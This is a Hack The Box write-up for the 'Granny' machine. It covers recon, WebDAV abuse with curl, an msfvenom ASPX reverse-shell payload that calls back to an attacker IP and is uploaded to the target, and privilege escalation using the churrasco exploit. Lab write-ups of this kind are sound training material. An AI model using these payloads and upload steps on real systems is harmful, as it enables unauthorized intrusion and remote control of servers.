
# Granny Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA granny 10.10.10.15``

80/tcp open  http    Microsoft IIS httpd 6.0

# ${{\color{purple}Initial Foothold}}\ $

``gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20``

WebDAV and Microsoft-IIS/6.0 **:white_check_mark:**

Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK

### To get options supported by your server
* Output can be Allow: DELETE,MKCOL,PROPFIND,GET,HEAD,PROPPATCH,OPTIONS,MOVE,PUT,GET,HEAD **:white_check_mark:**
 
``curl -i -X OPTIONS http://example.com``

### To create folder

``curl -X MKCOL 'http://example.com/webdav/new_folder'``

### To delete folder

``curl -X DELETE 'http://example.com/webdav/new_folder'``

### To delete file

``curl -X DELETE 'http://example.com/webdav/somefolder/somefile.txt'``

### To upload file

``curl -T '/path/to/local/file.dat' 'http://example.com/webdav/somefolder/somename.dat'``

### Use davtest to test the webdav

``davtest -url http://10.10.10.15``

![granny1](https://user-images.githubusercontent.com/123066149/219883013-10a473c2-110d-4c67-9f59-c22f58492326.PNG)


# ${{\color{purple}Exploitation}}\ $ 

``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=1234 -f aspx -o exploit.aspx``

``curl -T '/home/kali/Documents/htb/granny/exploit.aspx' 'http://10.10.10.15/exploit.txt'``

![image](https://user-images.githubusercontent.com/123066149/219883097-39d9adad-1c89-4db5-a4d0-419d5c16b29e.png)

![image](https://user-images.githubusercontent.com/123066149/219883154-cb678071-5807-429e-8a9a-2a5114bd470c.png)

![image](https://user-images.githubusercontent.com/123066149/219883179-44b0e799-a345-4fdd-b73b-1c976d3ad637.png)


# ${{\color{purple}Privilege Escalation}}\ $

i used windows exploit suggester for linux :

### The database must be updated 

``python windows-exploit-suggester.py --update``

``python windows-exploit-suggester.py -i systeminfo.txt -d 2023-02-18-mssb.xls``

![image](https://user-images.githubusercontent.com/123066149/219883428-006639e7-a8bc-44ef-9ebe-b94d1193dcbf.png)

``python windows-exploit-suggester.py -i systeminfo.txt -d 2023-02-18-mssb.xls > vuln.txt``

![image](https://user-images.githubusercontent.com/123066149/219884565-c4650af3-3487-4a98-98e2-38f5390de595.png)

Finally the exploits of Windows-Exploit-Suggester, did not give me anything so I did a google search !

![image](https://user-images.githubusercontent.com/123066149/219884655-70e92357-11ac-4d58-a3ca-8e1be7f5c844.png)

![image](https://user-images.githubusercontent.com/123066149/219884682-5aa53156-701a-4e8c-b5bc-a53e56c7fce9.png)

![image](https://user-images.githubusercontent.com/123066149/219884698-20b0934e-37c0-4733-b84e-447b418dd4ce.png)

### I used the churrasco exploit from the jivoi repo :

![image](https://user-images.githubusercontent.com/123066149/219884822-e5772d5f-e936-4aec-a1da-449858645c7a.png)

![image](https://user-images.githubusercontent.com/123066149/219884875-ed7aae9b-29ae-41fa-a149-2db19a92fb39.png)

# ${{\color{purple}Points of Improvement}}\ $

* Don't forget to make an ``nmap script vuln``
* There was no powershell on the box so I used ``Windows-Exploit-Suggester-python3``
* Don't forget to use a good ``gobuster``
* Ftp and smb are good protocols to use on old machines without powershell
* For the priv esc you have to stay wide and not to search too precisely with a searchploit a google search is better !

![image](https://user-images.githubusercontent.com/123066149/219885105-b97268f4-97f0-4f5b-92bf-f7c9b6d88e52.png)




